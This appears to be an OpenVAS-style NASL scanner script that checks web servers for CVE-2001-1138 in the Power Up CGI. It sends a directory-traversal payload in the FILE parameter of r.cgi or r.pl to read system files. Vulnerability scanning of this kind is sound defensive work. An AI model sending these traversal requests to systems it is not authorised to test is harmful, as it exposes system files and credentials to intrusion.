if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.10776" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 3304 );
	script_cve_id( "CVE-2001-1138" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Power Up Information Disclosure" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2001 SecuriTeam" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.securiteam.com/unixfocus/5PP062K5FO.html" );
	script_tag( name: "solution", value: "Disable access to the CGI until the author releases a patch." );
	script_tag( name: "summary", value: "The remote server is using the Power Up CGI.
  This CGI exposes critical system information, and allows remote attackers
  to read any world readable file." );
	script_tag( name: "solution_type", value: "Mitigation" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
files = traversal_files();
for dir in nasl_make_list_unique( "/", "/cgi-bin/powerup", "/cgi_bin/powerup", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	for url in make_list( dir + "/r.cgi",
		 dir + "/r.pl" ) {
		for file in keys( files ) {
			url = NASLString( url, "?FILE=../../../../../../../../../../", files[file] );
			if(http_vuln_check( port: port, url: url, pattern: file )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

